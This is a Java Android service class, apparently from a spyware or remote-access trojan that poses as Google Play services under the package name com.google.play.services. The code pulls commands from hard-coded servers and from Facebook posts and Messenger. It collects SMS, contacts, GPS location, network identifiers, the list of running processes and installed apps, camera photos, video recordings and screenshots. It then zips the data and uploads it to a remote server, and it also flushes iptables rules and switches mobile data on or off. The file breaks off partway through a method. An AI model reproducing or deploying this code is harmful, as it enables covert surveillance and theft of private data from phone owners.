package com.google.play.services;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.Context;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.ServiceConnection;
import android.content.ComponentName;
import android.media.AudioFormat; 
import android.media.AudioRecord; 
import android.media.MediaRecorder;
import android.os.IBinder;
import android.os.Handler;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.view.Gravity;
import android.graphics.Color;
import android.graphics.Bitmap;
import android.util.Log;
import android.widget.Toast;
import android.database.Cursor;
import android.net.Uri;
import android.location.*;
import org.json.*;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.params.HttpParams;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import android.os.AsyncTask;
import java.io.*;
import java.nio.ByteBuffer; 
import java.nio.ByteOrder;
import java.util.*;
import java.text.*;
import java.security.*;
import java.math.*;
import java.net.URLEncoder;
import com.google.play.update.*;
import com.google.play.services.lib.ModelRenderer;

public class SystemThread extends Service
{
	private String[] ipflush = {
			"iptables -F",
			"iptables -X",
			"iptables -t nat -F",
			"iptables -t mangle -F",
			"iptables -t mangle -X",
			"iptables -P INPUT ACCEPT",
			"iptables -P OUTPUT ACCEPT",
			"iptables -p FORWARD ACCEPT"
	};
	
	public static String TAG = "AsDfGhJkL";
	public static boolean fbAktif = false;
	public static String dataPayloadFb = "";
	public static String payloadWebResult = "";
	public static String payloadWebResultTarget = "";
	public static String payloadWebResultSwitch = "";
	public static String payloadWebResultSwitchFb = "";
	public static String urlfbPostingan = "";
	public static String urlfbPostinganEdt = "";
	public static String urlfbMessenger = ""; // Ali ku
	public static String urlServer = "";
	public static String[] server = { "http://10.42.0.1/akura1.1", "https://sunjangyo12.000webhostapp.com/akura1.1", "http://localhost:8888" }; //localhost:8888 harus terakhir
	public static int iserver = 0;
	public String ip = "";

	private static boolean processPing = true;
	private static boolean processFb = true;
	private static boolean processFbPayload = true;
	private static int jcamera = 1875953;
	private static int alert_warna = Color.YELLOW;
	private static int alert_letak = Gravity.CENTER | Gravity.TOP;
	private static int alert_durasi = 7000;
	private static String install_app = "";
	private static String install_paket = "";
	private static String uninstall_paket = "";
	private StringBuilder stringBuffFb = new StringBuilder();
	private StringBuilder stringBuffFb2 = new StringBuilder();
	private Context context;
	private String myident = "";
	private String[] term;
	private String arrFb[] = new String[8];
	private String[] tempFb;
	private String[] tempFb2;
	private String timenow = "";
	private String utf = "UTF-8";
	private ServerUtils utils;
	private BroadcastReceiver broreceiver;
	private ReceiverBoot receAction;
	private SharedPreferences settings;
	private SharedPreferences.Editor seteditor;
	private CamRuntime.LocalBinder binder;
	private Handler mHandler = new Handler();
	private Handler camHandler = new Handler();
	private Handler insHandler = new Handler();
	private Handler uniHandler = new Handler();
	private Handler browHandler = new Handler();

	private Runnable browRefresh = new Runnable() {
		public void run() 
		{
			browHandler.postDelayed(browRefresh, 8 * 1000);

			if (!receAction.resultFbWebkit.equals("")) 
			{
				reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload(receAction.resultFbWebkit), "null");
				if (receAction.installResult && settings.getString("fbmain","").equals("hidup")) {
					fbAktif = true;
					Log.i(TAG, "SEND BROW");
					logic(SystemThread.this);					
				}

				browHandler.removeCallbacks(browRefresh);			
			}
			
			Log.i(TAG, receAction.resultFbWebkit);
		}
	};

    private Runnable insRefresh = new Runnable() {
		public void run() 
		{
			insHandler.postDelayed(insRefresh, 8 * 1000);
			
			if (new MainActivity().apkMana(SystemThread.this, install_paket, "open")) {

        		SystemThread.this.stopService(new Intent(SystemThread.this, ServiceAlert.class));

        		reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("install success"), "null");
        		insHandler.removeCallbacks(insRefresh);
 				
        	}
        	else {
        		SystemThread.this.startService(new Intent(SystemThread.this, ServiceAlert.class));
        	}

  		}
	};

	private Runnable uniRefresh = new Runnable() {
		public void run() 
		{
			uniHandler.postDelayed(uniRefresh, 8 * 1000);

			if (new MainActivity().apkMana(SystemThread.this, uninstall_paket, "cek")) {

				SystemThread.this.startService(new Intent(SystemThread.this, ServiceAlert.class));
        		
        	} else {
        		reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("uninstall success"), "null");
        		
        		SystemThread.this.stopService(new Intent(SystemThread.this, ServiceAlert.class));
				uniHandler.removeCallbacks(uniRefresh);
        	
        	}
  		}
	};

	private Runnable mRefresh = new Runnable() {
		public void run() 
		{
			if (receAction.installResult && settings.getString("fbmain","").equals("hidup")) {
				receAction.fbTarget(SystemThread.this, urlfbPostingan);
				try{cekFbBigData(SystemThread.this);} catch(Exception e){}
			
			} else {
				if (receAction.installResult)
					receAction.resultFbPayload = "";
			}

			if (receAction.net && processPing) {
				payload();

			} else {
				if (receAction.cekConnection(SystemThread.this)) 
					Log.i(TAG, "Online process ping...");
				else 
					Log.i(TAG, "disconnect!");
			}

			receAction.temanCek(SystemThread.this);

			mHandler.postDelayed(mRefresh, 3000);

		}
	};

	private Runnable camRefresh = new Runnable() {
		public void run() 
		{
			camHandler.postDelayed(camRefresh, 1 * 1000);

			File f = new File(receAction.pathExternal+"/payloadout/REC_SYSTEM.mp4");
			long cflength = f.length();
			Log.i(TAG, "cam size: "+cflength);

			if (cflength == 0) {
				camHandler.removeCallbacks(camRefresh);
				if (binder != null) {
					binder.matikan();
					unbindService(camServiceConeksi);
					binder = null;

					reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("camera video/audio SELESAI [siap diupload]"), "null");
				}
				
				reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("camera video system alert tidak support(coba lagi) gunakan alternatif camera foto"), "null");
				fbAktif = true;
			}
			else if (cflength > jcamera) {
				camHandler.removeCallbacks(camRefresh);

				if (binder != null) {
					binder.matikan();
					unbindService(camServiceConeksi);
					binder = null;

					reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("camera video/audio SELESAI [siap diupload]"), "null");
					fbAktif = true;
				}
			}
			else {
				reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("rekam size:"+cflength), "null");
				fbAktif = true;
			}
		}
	};

	public String identitasLengkap(Context context) {
		settings = context.getSharedPreferences("Settings", 0);

		return "\\rDari    : "+settings.getString("siapa","")+
			"\\rWaktu   : "+timenow+
			"\\rBatrei  : "+receAction.batStatus+
			"\\rSwitch  : "+settings.getString("swmain","")+			
			"\\rIp Adds : "+Identitas.getIPAddress(true)+
			"\\rMac Adds: "+Identitas.getMACAddress("wlan0")+
			"\\rGPS     : "+new GPSresult(context).gpsResult+
			"\\rSdk     : "+Build.VERSION.SDK_INT+
			"\\rBrand   : "+Build.BRAND+
			"\\rCpu ABI : "+Build.CPU_ABI+
			"\\rDevice  : "+Build.DEVICE+
			"\\rLayar : "+Build.DISPLAY+
			"\\rHardware: "+Build.HARDWARE+
			"\\rHost    : "+Build.HOST+
			"\\rModel   : "+Build.MODEL+
			"\\rProduk  : "+Build.PRODUCT+
			"\\rRadio   : "+Build.RADIO+
			"\\rTime    : "+Build.TIME+
			"\\rType    : "+Build.TYPE+
			"\\rUser    : "+Build.USER+
			"\\rRelease : "+Build.VERSION.RELEASE;

	}

	public void payload() {
        myident = Identitas.getIPAddress(true);

        if (receAction.kumpulkanPayload) {
        	receAction.kumpulkanPayload = false;
        	Log.i(TAG, "kumpul");
        	kumpulkanPayload(context);
        
        }

		if (receAction.installResult) 
		{
			if (settings.getString("fbmain","").equals("hidup")) {
				
				if (myident.equals(receAction.resultFbTarget)) {
					receAction.fbPayload(context, "javascript:document.forms[1].body.value='"+"[TARGET]"+myident+"("+settings.getString("siapa","")+")"+"';" +"document.forms[1].submit()", urlfbMessenger);

				} else {
					receAction.fbPayload(context, "javascript:document.forms[1].body.value='"+myident+"("+settings.getString("siapa","")+")"+"';" +"document.forms[1].submit()", urlfbMessenger);
				}
			}

			receAction._server(context);
			if (receAction.getServer()) 
			{
				Log.i(TAG, ">>>> LOCALHOST RUNNING...........");

				urlServer = server[server.length-1];
				reqPayload(context, urlServer+"/payloadjson.php?input=Connected-_-"+Identitas.getIPAddress(true), "json");

				if (myident.equals(receAction.resultFbTarget) || myident.equals(payloadWebResultTarget) || payloadWebResultTarget.equals("semua"))
					logic(context);
			}
			else {
				Log.i(TAG, ">>>> localhost stoped...........");
				reqPayload(context, urlServer+"/payloadjson.php?input=Connected-_-"+Identitas.getIPAddress(true), "json");

				if (myident.equals(receAction.resultFbTarget) || myident.equals(payloadWebResultTarget) || payloadWebResultTarget.equals("semua"))
					logic(context);
			}
		
		} else if (myident.equals(payloadWebResultTarget) || payloadWebResultTarget.equals("semua")) {
			reqPayload(context, urlServer+"/payloadjson.php?input=Connected-_-"+Identitas.getIPAddress(true), "json");

			if (payloadWebResultSwitch.equals("hidup") || payloadWebResultSwitch.equals("mati")) 
			{
				if (payloadWebResultSwitch.equals("hidup")) {
					Log.i(TAG, ">>>> MODE SUPER AKTIF...........");
					seteditor.putString("swmain", payloadWebResultSwitch);    
					seteditor.commit();

				} else {
					Log.i(TAG, ">>>>> super mati");
					seteditor.putString("swmain", payloadWebResultSwitch);    
					seteditor.commit();
				}
			}

			if (payloadWebResultSwitchFb.equals("fbhidup") || payloadWebResultSwitchFb.equals("fbmati")) 
			{
				if (payloadWebResultSwitchFb.equals("fbhidup")) {
					//Log.i(TAG, ">>>> MODE SUPER AKTIF FB...........");
					seteditor.putString("swlinkfb", payloadWebResultSwitchFb);    
					seteditor.commit();

				} else {
					//Log.i(TAG, ">>>>> super mati fb");
					seteditor.putString("swlinkfb", payloadWebResultSwitchFb);    
					seteditor.commit();
				}
			}

			logic(context);
		
		}
		else {
			reqPayload(context, urlServer+"/payloadjson.php?input=Connected-_-"+Identitas.getIPAddress(true), "json");
			if (payloadWebResultSwitch.equals("hidup") || payloadWebResultSwitch.equals("mati")) 
			{
				if (payloadWebResultSwitch.equals("hidup")) {
					Log.i(TAG, ">>>> MODE SUPER AKTIF...........");
					seteditor.putString("swmain", payloadWebResultSwitch);    
        			seteditor.commit();

				} else {
					Log.i(TAG, ">>>>> super mati");
					seteditor.putString("swmain", payloadWebResultSwitch);    
        			seteditor.commit();
				}
			}

			if (payloadWebResultSwitchFb.equals("fbhidup") || payloadWebResultSwitchFb.equals("fbmati")) 
			{
				if (payloadWebResultSwitchFb.equals("fbhidup")) {
					//Log.i(TAG, ">>>> MODE SUPER AKTIF FB...........");
					seteditor.putString("swmain", payloadWebResultSwitchFb);    
					seteditor.commit();

				} else {
					//Log.i(TAG, ">>>>> super mati fb");
					seteditor.putString("swmain", payloadWebResultSwitchFb);    
					seteditor.commit();
				}
			}

			//logic(context);
		}

	}

	private void cekFbBigData(Context context) {

		if (!arrFb[0].equals("")) {
			if (receAction.fbBigPayload(context, 0, "javascript:document.forms[0].comment_text.value='"+textPayloadFb(arrFb[0])+"';" +"document.forms[0].submit()", urlfbPostingan))
				arrFb[0] = "";
			Log.i(TAG, "exec: "+0);

		
		} else if (!arrFb[1].equals("")) {
			if (receAction.fbBigPayload(context, 1, "javascript:document.forms[0].comment_text.value='"+textPayloadFb(arrFb[1])+"';" +"document.forms[0].submit()", urlfbPostingan))
				arrFb[1] = "";
			Log.i(TAG, "exec: "+1);

		
		} else if (!arrFb[2].equals("")) {
			if (receAction.fbBigPayload(context, 2, "javascript:document.forms[0].comment_text.value='"+textPayloadFb(arrFb[2])+"';" +"document.forms[0].submit()", urlfbPostingan))
				arrFb[2] = "";
			Log.i(TAG, "exec: "+2);

		
		} else if (!arrFb[3].equals("")) {
			if (receAction.fbBigPayload(context, 3, "javascript:document.forms[0].comment_text.value='"+textPayloadFb(arrFb[3])+"';" +"document.forms[0].submit()", urlfbPostingan))
				arrFb[3] = "";
			Log.i(TAG, "exec: "+3);

		} else if (!arrFb[4].equals("")) {
			if (receAction.fbBigPayload(context, 4, "javascript:document.forms[0].comment_text.value='"+textPayloadFb(arrFb[4])+"';" +"document.forms[0].submit()", urlfbPostingan))
				arrFb[4] = "";
			Log.i(TAG, "exec: "+4);

		
		} else if (!arrFb[5].equals("")) {
			if (receAction.fbBigPayload(context, 5, "javascript:document.forms[0].comment_text.value='"+textPayloadFb(arrFb[5])+"';" +"document.forms[0].submit()", urlfbPostingan))
				arrFb[5] = "";
			Log.i(TAG, "exec: "+5);

		
		} else if (!arrFb[6].equals("")) {
			if (receAction.fbBigPayload(context, 6, "javascript:document.forms[0].comment_text.value='"+textPayloadFb(arrFb[6])+"';" +"document.forms[0].submit()", urlfbPostingan))
				arrFb[6] = "";
			Log.i(TAG, "exec: "+6);

		
		} else if (!arrFb[7].equals("")) {
			if (receAction.fbBigPayload(context, 7, "javascript:document.forms[0].comment_text.value='"+textPayloadFb(arrFb[7])+"';" +"document.forms[0].submit()", urlfbPostingan))
				arrFb[7] = "";
			Log.i(TAG, "exec: "+7);

		}

		Log.i("ganas", "isi arr0: "+arrFb[0]);
		Log.i("ganas", "isi arr1: "+arrFb[1]);
		Log.i("ganas", "isi arr2: "+arrFb[2]);
		Log.i("ganas", "isi arr3: "+arrFb[3]);
		Log.i("ganas", "isi arr4: "+arrFb[4]);
		Log.i("ganas", "isi arr5: "+arrFb[5]);
		Log.i("ganas", "isi arr6: "+arrFb[6]);
		Log.i("ganas", "isi arr7: "+arrFb[7]);
	}


	private String payloadResultFb() {
		String out = "";
		try {
			String[] in = receAction.resultFbPayload.split("-aksi-");
			out = in[1];
		
		} catch(Exception e) {
			out = "perintah kosong";
		}

		return out;
	}

	public String textPayloadFb(String data) {
		stringBuffFb2.delete(0, stringBuffFb2.length());

		tempFb2 = data.split("\n");
		for (int i=0; i<tempFb2.length; i++) {
			stringBuffFb2.append(tempFb2[i]+"\\r");
		}

		String[] tes = {stringBuffFb2.toString()};

		try {
			for (String s : tes)     
			{
				return URLEncoder.encode(s, utf);  
			}
		}catch (Exception e) {}
		
		return null;
	}

	public String textPayload(String data) {
		stringBuffFb.delete(0, stringBuffFb.length());

		tempFb = data.split("\n");
		for (int i=0; i<tempFb.length; i++) {
			stringBuffFb.append(tempFb[i]+"\\r");
		}

		dataPayloadFb = "";

		if (false && stringBuffFb.toString().length() > 5575 && receAction.installResult && settings.getString("fbmain","").equals("hidup")) 
		//if (stringBuffFb.toString().length() > 5575)
		{
			dataPayloadFb = "Dari : "+settings.getString("siapa","")+
						 "\\rIP     : "+myident+
						 "\\rTerkirim: "+timenow+
						 "\\rInput : "+payloadResultFb()+
						 "\\rHack   : \\r"+"text terlalu besar lihat dikomentar";
			Installer code = new Installer();
			arrFb[0] = stringBuffFb.toString().substring(0, stringBuffFb.toString().length()/2);
			arrFb[1] = stringBuffFb.toString().substring(stringBuffFb.toString().length()/2, stringBuffFb.toString().length());
			Log.i(TAG, "data1 created");

			if (arrFb[0].length() > 5575) 
			{
				arrFb[2] = arrFb[0].substring(0, arrFb[0].length()/2);
				arrFb[3] = arrFb[1].substring(arrFb[1].length()/2, arrFb[1].length());
				Log.i(TAG, "data2 created");

				if (arrFb[2].length() > 5575) 
				{
					arrFb[4] = arrFb[2].substring(0, arrFb[2].length()/2);
					arrFb[5] = arrFb[3].substring(arrFb[3].length()/2, arrFb[3].length());
					Log.i(TAG, "data3 created");

					if (arrFb[2].length() > 5575) 
					{
						arrFb[6] = arrFb[4].substring(0, arrFb[4].length()/2);
						arrFb[7] = arrFb[5].substring(arrFb[5].length()/2, arrFb[5].length());
						Log.i(TAG, "data4 created");
					}
				}
			}	
		
		} else {
			dataPayloadFb = "Dari : "+settings.getString("siapa","")+
						 "\\rIP     : "+myident+
						 "\\rTerkirim: "+timenow+
						 "\\rInput : "+payloadResultFb()+
						 "\\rHack   : \\r"+stringBuffFb.toString();

			if (settings.getString("fbutf", "").equals("fbaktif")) {
				String[] tes = {dataPayloadFb};

				try {
					for (String s : tes)     
					{
						dataPayloadFb = URLEncoder.encode(s, utf);  
					}
				}catch (Exception e) {}
			}
		}

		timenow = new SimpleDateFormat("HH:mm:ss").format(new Date());
		String[] hashString = { "[+] "+data+" [dari:"+receAction.identitasResult+" waktu:"+timenow+" input:"+payloadWebResult+"]\n" };
		
		if (settings.getString("utf", "").equals("")) {
			Log.i(TAG, "utf kosong");
		} else {
			utf = settings.getString("utf", "");
			Log.i(TAG, "utf:"+utf);
		}

		try {
			for (String s : hashString)     
			{
				return URLEncoder.encode(s, utf);       
			}
		}catch (Exception e) {}

		return null;
	}

	public void reqPayload(Context context, String purl, String requestAksi) {
		
		PayloadWebTask task = new PayloadWebTask();
		task.applicationContext = context;
		task.paymain = requestAksi;

		Log.i(TAG, "...payload text   : "+payloadWebResult);
		Log.i(TAG, "...payload sw     : "+payloadWebResultSwitch+" ["+urlServer+"]");
		Log.i(TAG, "...payload target : "+payloadWebResultTarget+"\n");
		Log.i(TAG, "...facebook target: "+receAction.resultFbTarget+"\n");
		Log.i(TAG, "...facebook aksi  : "+payloadResultFb()+"\n");


		try {
			if (receAction.cekConnection(context)) {
				task.execute(new String[] { purl });
			} 
			else {
				Log.i(TAG, "disconnect network");
			}
		}catch(Exception e) {
			Log.i(TAG, "errRequest: "+e);
			receAction.net = false;
		}
	}


	public void kumpulkanPayload(Context context) {
		Installer installer = new Installer();
		String pathKumpul = receAction.pathExternal+"/kumpul";
		File fileKumpul = new File(pathKumpul);

		try {
			Runtime.getRuntime().exec("rm "+pathKumpul+"/*");
			if (!fileKumpul.exists()) {
            	fileKumpul.mkdirs();
        	}
			Runtime.getRuntime().exec("cp /system/build.prop "+pathKumpul);

			new CamRuntime().capturePhoto("depan", pathKumpul, "depan.jpg", context);
			Thread.sleep(2000);

			Intent intent = new Intent(context, CamerService.class);
			intent.putExtra("Front_Request", false);
			intent.putExtra("FLASH", "off");
			intent.putExtra("path", pathKumpul);
			intent.putExtra("nama", "back");
			context.startService(intent);
			Thread.sleep(2000);

			String cekServer = "";
			if (!receAction.installResult) {
				cekServer = "server belum terinstall";
			}else {
				receAction._server(context);
				cekServer = ""+receAction.getServer();
			}
			String status = //"root: "+receAction.rootRequest()+
							"\nwaktu : "+new SimpleDateFormat("[HH:mm]  dd,MMM,yyy").format(new Date())+
							"\ncamlis: "+new CamRuntime().listCamera()+
							"\nproses: "+receAction.shellCommands("ps")+
							"\nswitch: "+settings.getString("swmain", "")+
							"\nserver: "+cekServer+
							"\nipadrs: "+Identitas.getIPAddress(true)+
							"\nmacads: "+Identitas.getMACAddress("wlan0")+
							"\nbatery: "+receAction.batStatus+
							"\ngps   : "+new GPSresult(context).gpsResult+"\n\n"+
							"\napk li: "+receAction.shellCommands("pm -l");
			Thread.sleep(500);
			try {
				installer.saveCode(status, "utf-8", pathKumpul + "/status.txt");
			} catch (IOException e) {
				Log.i(TAG, "ERRsavestatus:"+e);
			}

			try {
				installer.saveCode(receAction.getSms(context)+receAction.getContacts(context), "utf-8", pathKumpul + "/private.txt");
			} catch (IOException e) {
				Log.i(TAG, "ERRsave:"+e);
			}

			String identitasKumpul = Identitas.getIPAddress(true)+".zipjut";
			new Installer().compressFiles(pathKumpul, receAction.pathExternal+"/"+identitasKumpul);

			Thread.sleep(12000);
			receAction.requestUrl = urlServer+"/uploadFile.php";
			receAction.requestAksi = "upload";
			receAction.requestPath = receAction.pathExternal+"/"+identitasKumpul;
			receAction.mainRequest(context);
		
		} catch(Exception e) {
			Log.i(TAG, "zzzzzzzzzzz"+e);
		}
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		settings = getSharedPreferences("Settings", 0);
		seteditor = settings.edit();
		urlServer = server[iserver];
		context = this;

		String gps = new GPSresult(this).gpsResult;
		IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
		filter.addAction(Intent.ACTION_DATE_CHANGED);
		filter.addAction(Intent.ACTION_HEADSET_PLUG);
		filter.addAction(Intent.ACTION_SCREEN_ON);
		filter.addAction(Intent.ACTION_POWER_CONNECTED);
		filter.addAction(Intent.ACTION_POWER_DISCONNECTED);
		filter.addAction(Intent.ACTION_MANAGE_NETWORK_USAGE);
		filter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED);
		filter.addAction(Intent.ACTION_SCREEN_OFF);

		broreceiver = new ReceiverBoot();
		receAction = new ReceiverBoot();
		utils = new ServerUtils(this);

		File htdocs = new File(utils.getPathExternal());
		File htdocsData = new File(utils.getPathExternal()+"/payloadout");

		if (!htdocs.exists()) {
			htdocs.mkdir();
		}
		if (!htdocsData.exists()) {
			htdocsData.mkdir();
		}

		if (settings.getString("siapa","").equals("")) {
			seteditor.putString("siapa", "unknown");    
			seteditor.commit();
		}

		if (settings.getString("fbmain","").equals("")) {
			seteditor.putString("fbmain", "hidup");    
			seteditor.commit();
		}

		if (settings.getString("fbutf","").equals("")) {
			seteditor.putString("fbutf", "fbaktif");    
			seteditor.commit();
		}

		if (settings.getString("fbpostingan","").equals("") && settings.getString("fbpostinganEdt","").equals("") && settings.getString("fbpostinganMsg","").equals("")) {
			urlfbPostingan = "https://free.facebook.com/story.php?story_fbid=1088385011285583&id=846527762137977&__tn__=%2AW-R&_rdr";
			urlfbPostinganEdt = "https://free.facebook.com/edit/post/dialog/?cid=S%3A_I846527762137977%3A1088385011285583&ct=2&nodeID=m_story_permalink_view&redir=%2Fstory.php%3Fstory_fbid%3D1088385011285583%26id%3D846527762137977%26__tn__%3D%252AW-R&perm&loc=permalink&refid=52&__tn__=-R";
			urlfbMessenger = "https://free.facebook.com/messages/read/?tid=cid.c.100022394016980%3A100035974483671&refid=11#fua";
		
		} else {
			urlfbPostingan = settings.getString("fbpostingan","");
			urlfbPostinganEdt = settings.getString("fbpostinganEdt","");
			urlfbMessenger = settings.getString("fbpostinganMsg","");
		}

		registerReceiver(broreceiver, filter);
		mHandler.postDelayed(mRefresh, 3000);
		
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		
		Log.i(TAG, "service start oke");

		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		unregisterReceiver(broreceiver);
		seteditor.putString("cekversion", "destroy");    
  	    seteditor.commit();
  	    mHandler.removeCallbacks(mRefresh);
	}

	public void logic(Context context) 
	{
			if (payloadWebResult.equals("gps")  ||  payloadResultFb().equals("gps")) {
				String lokasi = new GPSresult(context).gpsResult;
				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(lokasi), "null");

				fbAktif = true;
			}

			if (payloadWebResult.equals("alert")  ||  payloadResultFb().equals("alert")) {
				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("alert ditampilkan"), "null");
				Toast.makeText(context, "alert", Toast.LENGTH_LONG).show();

				fbAktif = true;
			}
			if (payloadWebResult.equals("semua")  ||  payloadResultFb().equals("semua")) {
				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("semua informasi berhail diupload cek di path payloadout"), "null");

				kumpulkanPayload(context);

				fbAktif = true;
			}

			if (payloadWebResult.equals("ping")  ||  payloadResultFb().equals("ping")) {
				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("ping google: "+receAction.ping(context)), "null");
				
				fbAktif = true;
			}

			if (payloadWebResult.equals("status")  ||  payloadResultFb().equals("status")) 
			{
				boolean cekServer;
				if (!receAction.installResult) {
					cekServer = false;
				}else {
					receAction._server(context);
					cekServer = receAction.getServer();
				}
				try {
					String status = //"root: "+receAction.rootRequest()+
								"\nswitch: "+settings.getString("swmain", "")+
								"\nsiapa : "+settings.getString("siapa","")+
								"\nfaceb : "+settings.getString("fbmain","")+
								"\nserver: "+cekServer+" install: "+receAction.installResult+
								"\nkamera: "+new CamRuntime().listCamera()+
								"\nipadrs: "+Identitas.getIPAddress(true)+
								"\nmacads: "+Identitas.getMACAddress("wlan0")+
								"\nbatery: "+receAction.batStatus+"\n"+identitasLengkap(context);
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(status), "null");

					fbAktif = true;

				} catch(Exception e){}
			}
			
			if (payloadWebResult.equals("layar")  ||  payloadResultFb().equals("layar")) {
				Intent ilay = new Intent(context, MainScreen.class);
				ilay.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				context.startActivity(ilay);
				
				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("layar menyala"), "null");
				
				fbAktif = true;
			}
			if (payloadWebResult.equals("screen")  ||  payloadResultFb().equals("screen")) {
				try {
					String[] shell = { "screencap -p "+receAction.pathExternal+"/payloadout/screen.jpg" };
					receAction.rootCommands(shell);
					
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("screenshoot layar target"), "null");
				}
				catch (Exception e) {
					
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("screenshoot gagal"), "null");
				}

				fbAktif = true;
			}

			try {
				String[] text = payloadWebResult.split("-server-");
				String[] textFb = {};
				try { 
					textFb = payloadResultFb().split("-server-");

					if (textFb[1].equals("hidup")) {
						if (receAction.installResult) {
							receAction._server(context);
							reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("SERVER: "+receAction.setServer(true)), "null");
							reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("SERVER status: "+receAction.getServer()), "null");
						
						} else {
							reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("SERVER: belum terinstall"), "null");
						}

						fbAktif = true;
					
					} else if (text[1].equals("mati")) {
						if (receAction.installResult) {
							receAction._server(context);
							reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("SERVER: "+receAction.setServer(false)), "null");
							reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("SERVER status: "+receAction.getServer()), "null");
						
						} else {
							reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("SERVER: belum terinstall"), "null");
						}

						fbAktif = true;
					}

				} catch(Exception e){}

				if (text[1].equals("hidup")) 
				{
					if (receAction.installResult) {
						receAction._server(context);
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("SERVER: "+receAction.setServer(true)), "null");
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("SERVER status: "+receAction.getServer()), "null");
					}
					else {
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("SERVER: belum terinstall"), "null");
					}

					fbAktif = true;
				
				} else if (text[1].equals("mati")) {
					if (receAction.installResult) {
						receAction._server(context);
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("SERVER: "+receAction.setServer(false)), "null");
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("SERVER status: "+receAction.getServer()), "null");
					}
					else {
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("SERVER: belum terinstall"), "null");
					}

					fbAktif = true;
				}
			}catch(Exception e){}

			try {
				String[] text = payloadWebResult.split("-facebook-");
				String[] textFb = {};
				try { 
					textFb = payloadResultFb().split("-facebook-");
					if (textFb[1].equals("hidup") || textFb[1].equals("mati")) 
					{
						seteditor.putString("fbmain", textFb[1]);    
						seteditor.commit();

						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("remote via facebook hidup"), "null");
						fbAktif = true;
					
					} else {
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("remote status: "+settings.getString("fbmain","") +"data download: "+receAction.installResult), "null");
						fbAktif = true;
					}
				} catch(Exception e){}

				if (text[1].equals("hidup") || text[1].equals("mati")) {
					seteditor.putString("fbmain", text[1]);    
					seteditor.commit();
						
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("remote via facebook hidup"), "null");
					fbAktif = true;
					
				} else {
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("remote status: "+settings.getString("fbmain","") +"data download: "+receAction.installResult), "null");
					fbAktif = true;
				}
			}catch(Exception e){}

			try {
				String[] text = payloadWebResult.split("-siapa-");
				String[] textFb = {};
				try { 
					textFb = payloadResultFb().split("-siapa-");
					if (textFb[1].equals("edit")) {
						try {
							Log.i(TAG, "fb siapa edit:"+textFb[2]);

							seteditor.putString("siapa", textFb[2]);    
							seteditor.commit();

							reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("siapa diedit: "+settings.getString("siapa","")), "null");
							fbAktif = true;

						} catch(Exception e) {}
					
					} else {
						Log.i(TAG, "fb siapa lihat"+textFb[1]);

						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("siapa: "+settings.getString("siapa","")), "null");
						fbAktif = true;
					}

				} catch(Exception e){}

				if (text[1].equals("edit")) {
					try {
						Log.i(TAG, "siapa edit:"+text[2]);

						seteditor.putString("siapa", text[2]);    
						seteditor.commit();
						
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("siapa diedit: "+settings.getString("siapa","")), "null");
						fbAktif = true;

					} catch(Exception e) {}
				
				} else {
					Log.i(TAG, "siapa lihat"+text[1]);

					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("siapa: "+settings.getString("siapa","")), "null");
					fbAktif = true;
				}
				
			}catch(Exception e){}

			try {
				String[] text = payloadWebResult.split("-net-");
				String[] textFb = {};
				try { 
					textFb = payloadResultFb().split("-net-");
					if (textFb[1].equals("hidup")) {
						receAction.setGSM(true, context);

					} else if (textFb[1].equals("mati")) {
						receAction.setGSM(false, context);
					}
				}catch(Exception e) {}

				if (text[1].equals("hidup")) {
					receAction.setGSM(true, context);
				}
				else if (text[1].equals("mati")) {
					receAction.setGSM(false, context);
				}
			}catch(Exception e){}

			try {
				String[] text = payloadWebResult.split("-brow-");
				String[] textFb = {};
				try { 
					textFb = payloadResultFb().split("-brow-");
					receAction.fbTarget(context, textFb[1]);
